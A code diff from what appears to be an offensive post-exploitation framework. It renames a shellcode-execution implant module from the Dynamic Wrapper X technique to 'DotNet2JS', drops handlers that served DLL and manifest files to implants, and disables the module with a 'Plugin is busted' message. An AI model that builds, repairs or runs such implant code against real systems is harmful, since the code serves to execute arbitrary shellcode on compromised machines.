@@ -25,14 +25,6 @@ class DotNet2JSJob(core.job.Job):
         data = data.decode('latin-1')
         task = handler.get_header(self.options.get("UUIDHEADER"), False)
 
-        if task == self.options.get("DLLUUID"):
-            handler.send_file(self.options.get("DYNWRAPXDLL"))
-            return
-
-        if task == self.options.get("MANIFESTUUID"):
-            handler.send_file(self.options.get("DYNWRAPXMANIFEST"))
-            return
-
         if task == self.options.get("SHIMX64UUID"):
             handler.send_file(self.options.get("SHIMX64DLL"))
 
@@ -52,7 +44,7 @@ class DotNet2JSJob(core.job.Job):
             return
 
         if data == "Complete":
-            super(DynWrapXShellcodeJob, self).report(handler, data)
+            super(DotNet2JSJob, self).report(handler, data)
 
         #self.print_good(data)
 
@@ -68,10 +60,10 @@ class DotNet2JSJob(core.job.Job):
             pass
         #self.shell.print_plain(str(self.errno))
 
-class DynWrapXShellcodeImplant(core.implant.Implant):
+class DotNet2JSImplant(core.implant.Implant):
 
-    NAME = "Shellcode via Dynamic Wrapper X"
-    DESCRIPTION = "Executes arbitrary shellcode using the Dynamic Wrapper X COM object"
+    NAME = "Shellcode via DotNet2JS"
+    DESCRIPTION = "Executes arbitrary shellcode using the DotNet2JS technique"
     AUTHORS = ["zerosum0x0", "Aleph-Naught-" "gentilwiki", "tiraniddo"]
 
     def load(self):
@@ -110,6 +102,8 @@ class DynWrapXShellcodeImplant(core.implant.Implant):
             print ret
 
     def run(self):
+        self.shell.print_error("Plugin is busted. See GitHub issue #1.")
+        return
 
         import uuid
         self.options.set("DLLUUID", uuid.uuid4().hex)
